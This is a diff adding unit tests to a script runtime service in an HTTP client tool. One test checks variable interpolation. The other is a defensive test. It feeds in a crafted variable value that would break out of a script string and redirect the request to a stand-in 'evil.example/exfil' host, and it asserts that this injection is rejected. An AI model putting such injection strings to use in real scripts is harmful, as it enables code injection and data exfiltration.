@@ -120,6 +120,77 @@ describe('RuntimeExecutionService lifecycle', () => {
     expect(response.runtime?.logs.map(log => log.message)).toEqual(['before base', 'after abc123']);
   });
 
+  it('evaluates runtime variable values and interpolates script source before execution', async () => {
+    const service = new RuntimeExecutionService(async () => new Map([
+      ['owner', 'Ada'],
+      ['headerSeed', 'scripted'],
+    ]));
+    const request: HttpRequest = {
+      http: {
+        method: 'POST',
+        url: 'http://127.0.0.1/runtime',
+      },
+      runtime: {
+        variables: [
+          { name: 'requestHeader', value: '{{headerSeed}}' },
+          { name: 'runtimeOwner', value: '{{owner}} Runtime' },
+          { name: 'combined', value: '{{runtimeOwner}}/{{requestHeader}}' },
+          { name: 'unresolved', value: '{{missingToken}}' },
+        ],
+        scripts: [
+          {
+            type: 'before-request',
+            code: [
+              'missio.request.setHeader("X-Combined", missio.variables.get("combined"));',
+              'missio.request.setHeader("X-Unresolved", missio.variables.get("unresolved"));',
+              'missio.variables.set("lateHeader", `late-${missio.variables.get("requestHeader")}`);',
+            ].join('\n'),
+          },
+          {
+            type: 'before-request',
+            code: 'missio.request.setHeader("X-Late", missio.variables.get("lateHeader"));',
+          },
+        ],
+      },
+    };
+
+    const prepared = await service.prepareHttpRequest(request, makeCollection());
+
+    expect(prepared.request.http?.headers?.find(header => header.name === 'X-Combined')?.value)
+      .toBe('Ada Runtime/scripted');
+    expect(prepared.request.http?.headers?.find(header => header.name === 'X-Late')?.value)
+      .toBe('late-scripted');
+    expect(prepared.request.http?.headers?.find(header => header.name === 'X-Unresolved')?.value)
+      .toBe('{{missingToken}}');
+    expect(prepared.extraVariables?.get('combined')).toBe('Ada Runtime/scripted');
+    expect(prepared.extraVariables?.get('unresolved')).toBe('{{missingToken}}');
+    expect(prepared.runtime.variableMutations).toEqual([
+      { scope: 'runtime', name: 'lateHeader', value: 'late-scripted', source: 'script' },
+    ]);
+  });
+
+  it('rejects script-source interpolation before variable data can become code', async () => {
+    const service = new RuntimeExecutionService(async () => new Map([
+      ['unsafeScript', 'x"); missio.request.url = "https://evil.example/exfil"; ("'],
+    ]));
+    const request: HttpRequest = {
+      http: { method: 'GET', url: 'http://127.0.0.1/runtime' },
+      runtime: {
+        scripts: [{ type: 'before-request', code: 'missio.request.setHeader("X-Value", "{{unsafeScript}}");' }],
+      },
+    };
+
+    await expect(service.prepareHttpRequest(request, makeCollection()))
+      .rejects.toBeInstanceOf(RuntimeExecutionError);
+
+    try {
+      await service.prepareHttpRequest(request, makeCollection());
+    } catch (error) {
+      expect((error as RuntimeExecutionError).runtime.errors[0].message).toMatch(/script source interpolation is not supported/i);
+      expect((error as RuntimeExecutionError).runtime.errors[0].message).toContain('missio.variables.get("name")');
+    }
+  });
+
   it('blocks filesystem and process access from before-request scripts', async () => {
     const service = new RuntimeExecutionService();
     const request: HttpRequest = {
